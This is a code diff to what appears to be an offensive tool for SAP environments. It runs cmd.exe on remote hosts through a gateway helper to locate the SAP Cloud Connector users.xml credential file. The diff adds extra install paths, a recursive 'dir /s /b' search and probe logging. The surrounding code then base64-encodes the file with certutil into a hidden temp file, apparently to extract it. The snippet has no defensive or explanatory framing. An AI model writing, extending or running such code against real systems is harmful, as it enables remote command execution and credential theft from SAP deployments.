@@ -1894,22 +1894,39 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 # Linux paths use ls + base64; Windows uses dir + certutil
                 if is_win:
                     win_roots = [
+                        r"C:\SAP\scc20",
+                        r"C:\SAP\scc",
+                        r"C:\SAP\scc21",
+                        r"C:\SAP\scc22",
+                        r"C:\SAP\scc19",
+                        r"C:\sap\scc",
                         r"C:\Program Files\SAP\Cloud Connector",
                         r"C:\Program Files\SAP\SAP Cloud Connector",
-                        r"C:\sap\scc",
                     ]
                     fpath = None
                     for root in win_roots:
                         candidate = rf"{root}\config\users.xml"
                         dir_out, _ = _gw("cmd.exe",
                                          f"/c if exist \"{candidate}\" echo FOUND")
+                        print(f"[*] SCC {host}: probe {candidate} → "
+                              f"{dir_out[:40]!r}")
                         if "FOUND" in dir_out:
                             fpath = candidate
                             print(f"[*] SCC {host}: found {candidate} on Windows")
                             break
+                    # Fallback: dir /s /b glob across C:\SAP\scc*
+                    if not fpath:
+                        glob_out, _ = _gw("cmd.exe",
+                                          r"/c dir /s /b C:\SAP\scc*\config\users.xml 2>nul")
+                        for line in glob_out.splitlines():
+                            line = line.strip()
+                            if line.lower().endswith("users.xml"):
+                                fpath = line
+                                print(f"[*] SCC {host}: glob found {fpath}")
+                                break
                     if not fpath:
                         print(f"[-] SCC {host}: users.xml not found via "
-                              f"{n.sid} on Windows (checked {len(win_roots)} paths)")
+                              f"{n.sid} on Windows")
                         continue
                     # certutil -encode reads file and base64-encodes it
                     tmp = r"C:\Windows\Temp\.scc_users.b64"
